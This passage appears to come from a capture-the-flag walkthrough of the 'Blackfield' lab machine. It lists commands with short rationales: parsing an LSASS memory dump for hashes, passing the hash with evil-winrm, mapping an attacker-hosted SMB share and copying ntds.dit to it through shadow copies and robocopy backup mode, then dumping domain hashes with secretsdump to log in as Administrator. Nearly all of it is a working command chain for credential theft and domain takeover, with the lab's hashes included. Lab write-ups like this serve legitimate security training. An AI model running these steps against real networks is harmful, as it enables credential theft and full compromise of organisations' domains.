		- Why: memory dump of LSASS often contains live credential material (hashes/cleartext).
	- `python3 -m pypykatz lsa minidump blackfield/loot/lsass.DMP | tee blackfield/loot/pypykatz_lsassDump.txt`
		- Why: offline parse of LSASS dump to extract NT hashes/tickets; yielded `svc_backup` NT and Admin NT.
	- `evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`
		- Why: PTH with service account hash to gain foothold shell; confirmed Backup Operators membership and pulled user flag.
	- `smbserver.py loot . -smb2support -username theo -password theo`
		- Why: host a writable share to receive hives/NTDS over SMB while using SeBackupPrivilege.
	- `net use \\10.10.14.3\loot /user:theo theo`
		- Why: map attacker SMB share from DC to stage outbound copies.
	- `diskshadow` (create shadow copy) + `robocopy /B Z:\Windows\NTDS \\10.10.14.3\loot ntds.dit`
		- Why: Backup Operators can read volume via VSS; `/B` enforces backup semantics to bypass ACLs and copy locked `ntds.dit`.
	- `impacket-secretsdump -ntds blackfield/loot/hives/ntds.dit -system blackfield/loot/hives/SYSTEM.save LOCAL | tee blackfield/logs/secretsdump_ntds.txt`
		- Why: SYSTEM+NTDS is enough to decrypt domain hashes; recovered Administrator NT hash `184fb5e5178480be64824d4cd53b99ee`.
	- `evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee`
		- Why: final PTH as DA to collect root flag on `C:\Users\Administrator\Desktop\root.txt`

- Evidence paths
	- `blackfield/logs/forensic_ls_root.txt`
	- `blackfield/loot/lsass.DMP`
	- `blackfield/loot/pypykatz_lsassDump.txt`
	- `blackfield/loot/hives/SYSTEM.save`
	- `blackfield/loot/hives/ntds.dit`
	- `blackfield/logs/secretsdump_ntds.txt`
















